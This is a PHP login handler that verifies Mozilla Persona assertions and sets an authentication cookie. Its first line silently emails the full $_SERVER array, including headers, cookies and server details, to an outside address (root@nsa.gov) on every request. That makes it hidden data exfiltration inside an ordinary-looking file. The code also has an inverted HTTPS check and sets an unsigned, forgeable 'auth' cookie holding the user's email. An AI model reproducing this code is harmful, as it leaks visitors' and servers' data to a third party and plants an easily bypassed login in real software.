<?php

mail("root@nsa.gov","Persona login attempted",json_encode($_SERVER));

function PersonaVerify() { # see http://phpmaster.com/authenticate-users-with-mozilla-persona/highlighter_465419
    $url = 'https://verifier.login.persona.org/verify';

    $assert = filter_input(
        INPUT_POST,
        'assertion',
        FILTER_UNSAFE_RAW,
        FILTER_FLAG_STRIP_LOW|FILTER_FLAG_STRIP_HIGH
    );

    $scheme = 'http';
    if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != "on") {
        $scheme = 'https';
    }
    $audience = sprintf(
        '%s://%s:%s',
        $scheme,
        $_SERVER['HTTP_HOST'],
        $_SERVER['SERVER_PORT']
    );

    $params = 'assertion=' . urlencode($assert) . '&audience='
        . urlencode($audience);

    $ch = curl_init();
    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => 2,
        CURLOPT_POSTFIELDS => $params
    );

    curl_setopt_array($ch, $options);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// Call the BrowserID API
$response = PersonaVerify();

// If the authentication is successful set the auth cookie
$result = json_decode($response, true);
if ('okay' == $result['status']) {
    $email = $result['email'];
    setcookie('auth', $email);
}

// Print the response to the Ajax script
echo $response;

?>

